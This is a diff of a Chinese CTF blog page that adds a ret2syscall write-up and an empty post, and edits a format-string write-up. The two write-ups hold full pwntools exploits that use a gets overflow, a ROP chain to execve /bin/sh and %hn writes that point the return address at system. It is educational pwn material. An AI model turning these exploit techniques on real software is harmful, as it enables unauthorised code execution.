@@ -64,6 +64,103 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-32位shellcode-其实是32位syscall" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/" class="article-date">
+  <time datetime="2023-06-13T12:27:54.000Z" itemprop="datePublished">2023-06-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/">32位shellcode(其实是32位syscall)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="查看程序保护"><a href="#查看程序保护" class="headerlink" title="查看程序保护"></a>查看程序保护</h2><p>NX栈不可执行开启，因此不能使用ret2shellcode了。<br>我们可以考虑一下ret2text或ret2syscall、ret2libc了</p>
+<p><img src="/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/QQ%E6%88%AA%E5%9B%BE20230613203038.png" alt="Alt text"></p>
+<h2 id="ida查看程序"><a href="#ida查看程序" class="headerlink" title="ida查看程序"></a>ida查看程序</h2><h4 id="打开一看，哇！左边超级多函数，必须来一波ROP执行系统调用！"><a href="#打开一看，哇！左边超级多函数，必须来一波ROP执行系统调用！" class="headerlink" title="打开一看，哇！左边超级多函数，必须来一波ROP执行系统调用！"></a>打开一看，哇！左边超级多函数，必须来一波ROP执行系统调用！</h4><h4 id="那我再看一下，又看到了老朋友gets函数，妥妥的栈溢出。"><a href="#那我再看一下，又看到了老朋友gets函数，妥妥的栈溢出。" class="headerlink" title="那我再看一下，又看到了老朋友gets函数，妥妥的栈溢出。"></a>那我再看一下，又看到了老朋友gets函数，妥妥的栈溢出。</h4><p><img src="/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/QQ%E6%88%AA%E5%9B%BE20230613203450.png" alt="Alt text"></p>
+<p>####程序中/bin/sh字符。</p>
+<p><img src="/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/QQ%E6%88%AA%E5%9B%BE20230613204509.png" alt="Alt text"></p>
+<h2 id="写题思路"><a href="#写题思路" class="headerlink" title="写题思路"></a>写题思路</h2><h4 id="题目其实已经给的很明确了，开启了NX保护，丢给我们一个炒鸡多函数的静态程序。这就是让我们用ret2syscall。"><a href="#题目其实已经给的很明确了，开启了NX保护，丢给我们一个炒鸡多函数的静态程序。这就是让我们用ret2syscall。" class="headerlink" title="题目其实已经给的很明确了，开启了NX保护，丢给我们一个炒鸡多函数的静态程序。这就是让我们用ret2syscall。"></a>题目其实已经给的很明确了，开启了NX保护，丢给我们一个炒鸡多函数的静态程序。这就是让我们用ret2syscall。</h4><h4 id="然而程序并没有给我们-bin-sh字符，因此需要我们把-bin-sh字符写入一个程序的一个位置，再把那个位置的地址填入对应的ebx寄存器里面即可，而这个位置一般是bss区。"><a href="#然而程序并没有给我们-bin-sh字符，因此需要我们把-bin-sh字符写入一个程序的一个位置，再把那个位置的地址填入对应的ebx寄存器里面即可，而这个位置一般是bss区。" class="headerlink" title="然而程序并没有给我们/bin/sh字符，因此需要我们把/bin/sh字符写入一个程序的一个位置，再把那个位置的地址填入对应的ebx寄存器里面即可，而这个位置一般是bss区。"></a>然而程序并没有给我们/bin/sh字符，因此需要我们把/bin/sh字符写入一个程序的一个位置，再把那个位置的地址填入对应的ebx寄存器里面即可，而这个位置一般是bss区。</h4><h4 id="那么在这个函数里如何写入-bin-sh呢？我们可以利用程序原有的gets函数来达成此目的。"><a href="#那么在这个函数里如何写入-bin-sh呢？我们可以利用程序原有的gets函数来达成此目的。" class="headerlink" title="那么在这个函数里如何写入/bin/sh呢？我们可以利用程序原有的gets函数来达成此目的。"></a>那么在这个函数里如何写入/bin/sh呢？我们可以利用程序原有的gets函数来达成此目的。</h4><h2 id="ret2syscall的主要原理"><a href="#ret2syscall的主要原理" class="headerlink" title="ret2syscall的主要原理"></a>ret2syscall的主要原理</h2><h4 id="64位程序"><a href="#64位程序" class="headerlink" title="64位程序"></a>64位程序</h4><p>将rax、rdx、rdi、rsi寄存器分别填入59、0、0、/bin/sh最后在加一个syscall指令的地址，就可以执行系统调用相当于system(/bin/sh)。</p>
+<h4 id="32位程序"><a href="#32位程序" class="headerlink" title="32位程序"></a>32位程序</h4><p>与64位大致同理，需要寄存器eax、ebx、ecx、edx分别为11、/bin/sh、0、0最后再使用int 0x80指令触发系统调用即可。</p>
+<h2 id="ROP对应的寄存器的gadget"><a href="#ROP对应的寄存器的gadget" class="headerlink" title="ROP对应的寄存器的gadget"></a>ROP对应的寄存器的gadget</h2><p><img src="/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/QQ%E6%88%AA%E5%9B%BE20230613210829.png" alt="Alt text"></p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><h4 id="第一次发送payload："><a href="#第一次发送payload：" class="headerlink" title="第一次发送payload："></a>第一次发送payload：</h4><h4 id="通过栈溢出把返回地址覆盖为gets函数的地址，从而劫持程序执行流执行gets函数，然后把gets函数的返回地址覆盖为main函数的地址，从而能够进行第二次栈溢出，把gets的参数覆盖为bss区的地址从而把gets函数执行时输入的内容存储在bss区里。"><a href="#通过栈溢出把返回地址覆盖为gets函数的地址，从而劫持程序执行流执行gets函数，然后把gets函数的返回地址覆盖为main函数的地址，从而能够进行第二次栈溢出，把gets的参数覆盖为bss区的地址从而把gets函数执行时输入的内容存储在bss区里。" class="headerlink" title="通过栈溢出把返回地址覆盖为gets函数的地址，从而劫持程序执行流执行gets函数，然后把gets函数的返回地址覆盖为main函数的地址，从而能够进行第二次栈溢出，把gets的参数覆盖为bss区的地址从而把gets函数执行时输入的内容存储在bss区里。"></a>通过栈溢出把返回地址覆盖为gets函数的地址，从而劫持程序执行流执行gets函数，然后把gets函数的返回地址覆盖为main函数的地址，从而能够进行第二次栈溢出，把gets的参数覆盖为bss区的地址从而把gets函数执行时输入的内容存储在bss区里。</h4><h4 id="第二次发送payload："><a href="#第二次发送payload：" class="headerlink" title="第二次发送payload："></a>第二次发送payload：</h4><h4 id="将对应的寄存器填入对应的值和字符串，从而执行系统调用，由于第一次发送payload之后，又发送了-bin-sh并存储在bss区里了，所以我们在只需要把bss区的地址填入ebx寄存器即可。"><a href="#将对应的寄存器填入对应的值和字符串，从而执行系统调用，由于第一次发送payload之后，又发送了-bin-sh并存储在bss区里了，所以我们在只需要把bss区的地址填入ebx寄存器即可。" class="headerlink" title="将对应的寄存器填入对应的值和字符串，从而执行系统调用，由于第一次发送payload之后，又发送了/bin/sh并存储在bss区里了，所以我们在只需要把bss区的地址填入ebx寄存器即可。"></a>将对应的寄存器填入对应的值和字符串，从而执行系统调用，由于第一次发送payload之后，又发送了/bin/sh并存储在bss区里了，所以我们在只需要把bss区的地址填入ebx寄存器即可。</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = <span class="title function_">process</span>(<span class="string">&quot;./not_&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#shellcode = <span class="title function_">asm</span>(shellcraft.<span class="title function_">sh</span>())</span><br><span class="line">flag_addr = <span class="number">0x80489a4</span></span><br><span class="line">#io.<span class="title function_">recv</span>()</span><br><span class="line">bss_addr = <span class="number">0x80eca00</span></span><br><span class="line">eax_addr = <span class="number">0x8048b0b</span></span><br><span class="line">edx_ecx_ebx_addr = <span class="number">0x806fcf0</span></span><br><span class="line">int_addr = <span class="number">0x806d8a5</span></span><br><span class="line">gets_addr = <span class="number">0x804f8d0</span></span><br><span class="line">main_addr = <span class="number">0x80489E0</span></span><br><span class="line">payload = b<span class="string">&quot;A&quot;</span>*<span class="number">0x2d</span> + <span class="title function_">p32</span>(gets_addr) + <span class="title function_">p32</span>(main_addr) + <span class="title function_">p32</span>(bss_addr)</span><br><span class="line"></span><br><span class="line">#gdb.<span class="title function_">attach</span>(io,b<span class="string">&quot;b main&quot;</span>)</span><br><span class="line">#<span class="title function_">pause</span>()</span><br><span class="line"></span><br><span class="line">io.<span class="title function_">sendline</span>(payload)</span><br><span class="line">io.<span class="title function_">sendline</span>(b<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">##向gets函数发送字符/bin/sh并存储在对应的bss区里</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&quot;A&quot;</span>*<span class="number">0x2d</span> + <span class="title function_">p32</span>(eax_addr) + <span class="title function_">p32</span>(<span class="number">11</span>) + <span class="title function_">p32</span>(edx_ecx_ebx_addr) + <span class="title function_">p32</span>(<span class="number">0</span>) + <span class="title function_">p32</span>(<span class="number">0</span>) +  <span class="title function_">p32</span>(bss_addr) +  <span class="title function_">p32</span>(int_addr)</span><br><span class="line"></span><br><span class="line">io.<span class="title function_">sendline</span>(payload)</span><br><span class="line">io.<span class="title function_">interactive</span>()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dinkjun.github.io/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/" data-id="cliubbu28000048v9dcnja521" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-栈迁移" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/06/07/%E6%A0%88%E8%BF%81%E7%A7%BB/" class="article-date">
+  <time datetime="2023-06-07T11:18:52.000Z" itemprop="datePublished">2023-06-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/06/07/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dinkjun.github.io/2023/06/07/%E6%A0%88%E8%BF%81%E7%A7%BB/" data-id="cliubbu2k000a48v9bjat9a0x" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-32位格式化字符串bss" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2023/06/04/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2bss/" class="article-date">
@@ -94,7 +191,7 @@
 <h1 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h1><h4 id="查找格式化字符串参数偏移"><a href="#查找格式化字符串参数偏移" class="headerlink" title="查找格式化字符串参数偏移"></a>查找格式化字符串参数偏移</h4><p>这里我在第二次输入的时候输入了8个A，步进到打印的printf函数之后马上查看栈的内容。<br>可以看到，如果按照正常的操作，那么<br>0xffffcf10 —▸ 0x804b0a0 ◂— ‘AAAAAAAA\n’<br>才是格式化字符串的第一个参数，但是实际上<br>0xffffcf14 —▸ 0x8048dae ◂— 0x6d6c6c77 /* ‘wllmmllw’ */<br>才是格式化字符串的第一个参数，这是在我不断排错，最后在脚本专门泄露一个栈上地址并打印出来才确定出来(呜呜呜)<br>所以gdb调试程序看格式化字符串参数偏移有时候也不一定准确。<br><img src="/2023/06/04/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2bss/QQ%E6%88%AA%E5%9B%BE20230606114658.png" alt="Alt text"></p>
 <h4 id="确定跳板"><a href="#确定跳板" class="headerlink" title="确定跳板"></a>确定跳板</h4><p>个人觉得:跳板的选取是栈地址1指向另一个栈地址2，然后地址2又指向另一个栈地址3,最后栈地址3里面的值最好是0。<br>这里我们确定的跳板是<br>ebp 0xffffcf28 —▸ 0xffffcf38 —▸ 0xffffcf48 ◂—0x0<br><img src="/2023/06/04/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2bss/QQ%E6%88%AA%E5%9B%BE20230606115422.png" alt="Alt text"></p>
 <h4 id="泄露存储返回地址和参数的栈地址"><a href="#泄露存储返回地址和参数的栈地址" class="headerlink" title="泄露存储返回地址和参数的栈地址"></a>泄露存储返回地址和参数的栈地址</h4><p>我们首先需要泄露出一个栈地址，然后通过栈地址和存储返回地址的栈地址的偏移(偏移不变)从而达到泄露出栈地址的目的。<br>那么应该泄露栈地址呢？我们应该选取栈地址1指向另一个栈地址2的参数泄露，然后泄露栈地址2通过与存储返回地址的栈地址的偏移(偏移不变)进行相应的计算就能够达到泄露存储返回地址的栈地址的目的，泄露存储参数的栈地址同理。<br>图中圈出来的的都是可以拿来泄露的栈地址，这里我们选取<br>第十个参数0xffffcf38 —▸ 0xffffcf48 ◂— 0x0</p>
-<p>计算存储返回地址的栈地址的偏移:0xcf48 - 0xcf2c = 0x1c<br>存储参数的栈地址与存储返回地址的栈地址的偏移:0x8<br><img src="/2023/06/04/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2bss/QQ%E6%88%AA%E5%9B%BE20230606120005.png" alt="Alt text"></p>
+<p>计算存储返回地址的栈地址的偏移:0xcf48 - 0xcf2c = 0x1c<br>存储参数的栈地址与存储返回地址的栈地址的偏移:0x8。<br>为什么是返回地址+0x8呢？因为正常调用一个函数(把返回地址修改成system函数)，后面会跟一个返回地址的，在往后一个才是用来存放参数。<br>函数在栈中的结构一般为:<br>函数————返回地址————函数参数<br><img src="/2023/06/04/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2bss/QQ%E6%88%AA%E5%9B%BE20230606120005.png" alt="Alt text"></p>
 <h1 id="写题思路"><a href="#写题思路" class="headerlink" title="写题思路"></a>写题思路</h1><p>这道题有俩种解法:修改返回地址和更改got表我选择修改返回地址，即把返回地址修改为system函数。  </p>
 <ol>
 <li>通过泄露栈上的栈地址然后计算偏移从而达到泄露存储返回地址和函数参数的栈地址的目的。  </li>
@@ -105,11 +202,13 @@
 和修改返回地址一样，在修改完返回地址之后我们依旧可以利用参数6的跳板来写入system函数的参数，在把第六个参数:<br>ebp 0xffffcf28 —▸ 0xffffcf38 —▸ 0xffffcf48 ◂—0x0<br>中的0xffffcf48写为parment_addr即用来存储函数参数的栈地址之后我们就应该向0xffffcf38即第十个参数写入存储参数的栈地址即stack_addr即可，后面的和修改返回地址一样，把parment_addr抬高两位后再写入stack_addr高两位地址即可。<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = b<span class="string">&quot;%&quot;</span> + <span class="title function_">str</span>(parment_addr&amp;<span class="number">0xffff</span>) + b<span class="string">&quot;c%6$hn&quot;</span></span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;Try again!\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&quot;%&quot;</span> + <span class="title function_">str</span>(stack_addr&amp;<span class="number">0xffff</span>) + b<span class="string">&quot;c%10$hn&quot;</span></span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;Try again!\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&quot;%&quot;</span> + <span class="title function_">str</span>((parment_addr+<span class="number">2</span>)&amp;<span class="number">0xffff</span>) + b<span class="string">&quot;c%6$hn&quot;</span></span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;Try again!\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&quot;%&quot;</span> + <span class="title function_">str</span>((stack_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>) + b<span class="string">&quot;c%10$hn&quot;</span></span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;Try again!\n&quot;</span>,payload)</span><br></pre></td></tr></table></figure></li>
 </ol>
 <h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = <span class="title function_">process</span>(<span class="string">&quot;./login&quot;</span>)</span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">io.<span class="title function_">recv</span>()</span><br><span class="line">io.<span class="title function_">send</span>(b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">payload = b<span class="string">&quot;%10$p%15$p&quot;</span></span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;your password:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">##泄露存储返回地址的栈地址</span><br><span class="line">io.<span class="title function_">recvuntil</span>(b<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">ret_addr = <span class="title function_">int</span>(io.<span class="title function_">recv</span>(<span class="number">8</span>),<span class="number">16</span>) - <span class="number">0x1c</span></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(ret_addr))</span><br><span class="line"></span><br><span class="line">##泄露用来存储函数参数的栈地址</span><br><span class="line">parment_addr = ret_addr + <span class="number">0x8</span></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(parment_addr))</span><br><span class="line"></span><br><span class="line">io.<span class="title function_">recvuntil</span>(b<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_addr = <span class="title function_">int</span>(io.<span class="title function_">recv</span>(<span class="number">8</span>),<span class="number">16</span>) - <span class="number">241</span></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = <span class="title function_">ELF</span>(<span class="string">&quot;/lib/i386-linux-gnu/libc-2.27.so&quot;</span>)</span><br><span class="line">base_addr = libc_addr - libc.<span class="property">sym</span>[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line"></span><br><span class="line">system_addr = libc.<span class="property">sym</span>[<span class="string">&quot;system&quot;</span>] + base_addr</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 泄露存储参数$0的栈地址</span><br><span class="line">payload = b<span class="string">&quot;%13$p&quot;</span></span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;Try again!\n&quot;</span>,payload)</span><br><span class="line">io.<span class="title function_">recvuntil</span>(b<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">stack_addr = <span class="title function_">int</span>(io.<span class="title function_">recv</span>(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">gdb.<span class="title function_">attach</span>(io,b<span class="string">&quot;b *0x80485AF&quot;</span>)</span><br><span class="line"><span class="title function_">pause</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 写入system函数参数</span><br><span class="line">payload = b<span class="string">&quot;%&quot;</span> + b<span class="string">&quot;12324&quot;</span> + b<span class="string">&quot;c%13$hn&quot;</span></span><br><span class="line">##写入$0</span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;Try again!\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&quot;%&quot;</span> + <span class="title function_">str</span>(ret_addr&amp;<span class="number">0xffff</span>) + b<span class="string">&quot;c%6$hn&quot;</span></span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;Try again!\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&quot;%&quot;</span> + <span class="title function_">str</span>(system_addr&amp;<span class="number">0xffff</span>) + b<span class="string">&quot;c%10$hn&quot;</span></span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;Try again!\n&quot;</span>,payload)</span><br><span class="line">## 到这里就把返回地址的低俩位字节写入了对应的system函数的地址。</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&quot;%&quot;</span> + <span class="title function_">str</span>((ret_addr+<span class="number">2</span>)&amp;<span class="number">0xffff</span>) + b<span class="string">&quot;c%6$hn&quot;</span></span><br><span class="line">## 这里把存储返回地址的栈地址+<span class="number">2</span>抬高两位以写入system函数的高两位地址。</span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;Try again!\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&quot;%&quot;</span> + <span class="title function_">str</span>((system_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>) + b<span class="string">&quot;c%10$hn&quot;</span></span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;Try again!\n&quot;</span>,payload)</span><br><span class="line">## 到这里就完成了把返回地址修改成system函数的地址了。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&quot;%&quot;</span> + <span class="title function_">str</span>(parment_addr&amp;<span class="number">0xffff</span>) + b<span class="string">&quot;c%6$hn&quot;</span></span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;Try again!\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&quot;%&quot;</span> + <span class="title function_">str</span>(stack_addr&amp;<span class="number">0xffff</span>) + b<span class="string">&quot;c%10$hn&quot;</span></span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;Try again!\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&quot;%&quot;</span> + <span class="title function_">str</span>((parment_addr+<span class="number">2</span>)&amp;<span class="number">0xffff</span>) + b<span class="string">&quot;c%6$hn&quot;</span></span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;Try again!\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&quot;%&quot;</span> + <span class="title function_">str</span>((stack_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>) + b<span class="string">&quot;c%10$hn&quot;</span></span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;Try again!\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.<span class="title function_">recvuntil</span>(<span class="string">&#x27;Try again!\n&#x27;</span>)</span><br><span class="line">io.<span class="title function_">sendline</span>(<span class="string">&#x27;wllmmllw&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.<span class="title function_">interactive</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h1 id="学到了什么？"><a href="#学到了什么？" class="headerlink" title="学到了什么？"></a>学到了什么？</h1><h4 id="1-由于格式化字符串在bss区里，所以我们不能就不能像之前那样随意修改栈上的内容了。我们需要选取一个跳板，利用跳板才能达到修改栈上内容的目的-一般的跳板应该是这样的-栈地址1指向另一个栈地址2，然后地址2又指向另一个栈地址3-最后栈地址3里面的值最好是0。这里我们确定的跳板是"><a href="#1-由于格式化字符串在bss区里，所以我们不能就不能像之前那样随意修改栈上的内容了。我们需要选取一个跳板，利用跳板才能达到修改栈上内容的目的-一般的跳板应该是这样的-栈地址1指向另一个栈地址2，然后地址2又指向另一个栈地址3-最后栈地址3里面的值最好是0。这里我们确定的跳板是" class="headerlink" title="1. 由于格式化字符串在bss区里，所以我们不能就不能像之前那样随意修改栈上的内容了。我们需要选取一个跳板，利用跳板才能达到修改栈上内容的目的:一般的跳板应该是这样的:栈地址1指向另一个栈地址2，然后地址2又指向另一个栈地址3,最后栈地址3里面的值最好是0。这里我们确定的跳板是"></a>1. 由于格式化字符串在bss区里，所以我们不能就不能像之前那样随意修改栈上的内容了。我们需要选取一个跳板，利用跳板才能达到修改栈上内容的目的:一般的跳板应该是这样的:栈地址1指向另一个栈地址2，然后地址2又指向另一个栈地址3,最后栈地址3里面的值最好是0。这里我们确定的跳板是</h4><h4 id="ebp-0xffffcf28-—▸-0xffffcf38-—▸-0xffffcf48-◂—0x0"><a href="#ebp-0xffffcf28-—▸-0xffffcf38-—▸-0xffffcf48-◂—0x0" class="headerlink" title="ebp 0xffffcf28 —▸ 0xffffcf38 —▸ 0xffffcf48 ◂—0x0"></a>ebp 0xffffcf28 —▸ 0xffffcf38 —▸ 0xffffcf48 ◂—0x0</h4><h4 id="2-修改返回地址和写入system函数参数时每次只能写入两个字节，所以在第一次写入或者修改了低两位地址之后，我们需要抬高存储返回地址或函数参数的栈地址两个字节之后再写入或者修改高两位地址。"><a href="#2-修改返回地址和写入system函数参数时每次只能写入两个字节，所以在第一次写入或者修改了低两位地址之后，我们需要抬高存储返回地址或函数参数的栈地址两个字节之后再写入或者修改高两位地址。" class="headerlink" title="2. 修改返回地址和写入system函数参数时每次只能写入两个字节，所以在第一次写入或者修改了低两位地址之后，我们需要抬高存储返回地址或函数参数的栈地址两个字节之后再写入或者修改高两位地址。"></a>2. 修改返回地址和写入system函数参数时每次只能写入两个字节，所以在第一次写入或者修改了低两位地址之后，我们需要抬高存储返回地址或函数参数的栈地址两个字节之后再写入或者修改高两位地址。</h4>
